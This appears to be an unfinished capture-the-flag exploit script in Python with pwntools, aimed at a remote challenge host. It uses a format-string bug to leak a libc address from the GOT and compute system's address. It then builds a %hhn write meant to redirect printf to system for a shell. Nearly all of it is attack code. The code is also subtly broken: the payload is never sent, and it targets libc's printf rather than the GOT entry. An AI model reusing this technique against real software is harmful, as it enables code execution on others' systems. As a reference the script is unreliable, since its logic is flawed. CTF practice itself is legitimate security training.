# leak 2-3 libc addresses using arbirary read %s
# calculate base address and thus system 
# overwrite a GOT entry that tells you to input things e.g. printf i.e. printf(buf);
# pass it \bin\sh
# you can probably run mutiple times to get those addresses since everything is static no pie 


'''
[0x404018] puts@GLIBC_2.2.5 -> 0x401030 ◂— endbr64 
[0x404020] fread@GLIBC_2.2.5 -> 0x401040 ◂— endbr64 
[0x404028] fclose@GLIBC_2.2.5 -> 0x401050 ◂— endbr64 
[0x404030] __stack_chk_fail@GLIBC_2.4 -> 0x401060 ◂— endbr64 
[0x404038] printf@GLIBC_2.2.5 -> 0x401070 ◂— endbr64 
[0x404040] memset@GLIBC_2.2.5 -> 0x401080 ◂— endbr64 
[0x404048] alarm@GLIBC_2.2.5 -> 0x401090 ◂— endbr64 
[0x404050] read@GLIBC_2.2.5 -> 0x4010a0 ◂— endbr64 
[0x404058] strcmp@GLIBC_2.2.5 -> 0x4010b0 ◂— endbr64 
[0x404060] setvbuf@GLIBC_2.2.5 -> 0x4010c0 ◂— endbr64 
[0x404068] fopen@GLIBC_2.2.5 -> 0x4010d0 ◂— endbr64 
[0x404070] perror@GLIBC_2.2.5 -> 0x4010e0 ◂— endbr64 
[0x404078] exit@GLIBC_2.2.5 -> 0x4010f0 ◂— endbr64 
'''
from pwn import * 

binary = "./program_patched"
p = process(binary)
p = remote("chal.firebird.sh", 35041)
elf = ELF(binary)
libc = ELF("./libc.so.6")

puts_entry = elf.got['puts']
printf_entry = elf.got['printf']
read_entry = elf.got['read']


p.recvuntil(b"Give me your first input:")
#p.sendline(b"AAAAAAAA-%5$p-%6$p-%7$p-%8$p-%9$p-%10$p-%11$p-%12$p")
p.sendline(b"%9$sAAAA" + p64(read_entry))
p.recvuntil(b"Your input:")
GOT_leak = int.from_bytes(p.recvuntil(b"A", drop=True), 'little')

libc.address = GOT_leak - libc.sym['read'] 
#print(hex(libc.address))
sys_addr = libc.sym['system']
print(hex(sys_addr)) # 0x7ff26e073290, they are not fixed

target_addr = libc.sym['printf']
print(hex(target_addr)) # 0x7ff4e4974c90 example, they are not fixed



# overwriting the addresses seems a bit hard 
# but we only need to overwrite the last 4 digits for example 
'''
0x7fa1a06b3290
0x7fa1a06c2c90
'''
# 6c2c and 6b32, they would change
# target_addr + 1
# target_addr +2 

# first parse system
A = (sys_addr >> 8) & 0xff  # 0x32, correspond to target_addr + 1
B = (sys_addr >> 16) & 0xff # 0x07, correspond to target_addr + 2
# need to use int to overwrite 
A = int(A)
B = int(B)
# set a to be smaller 
if (A > B ):
    temp = A 
    A = B
    B = temp

payload = flat(
    b'%' + str(A).encode() + b'c%10$hhn', # %AAAc%10$hhn 8 th argument, 12 bytes
    b'%' + str(B - A).encode() + b'c%11$hhn', # %AAc%10$hhn
    p64(target_addr + 1),
    p64(target_addr + 2),
)
p.interactive()
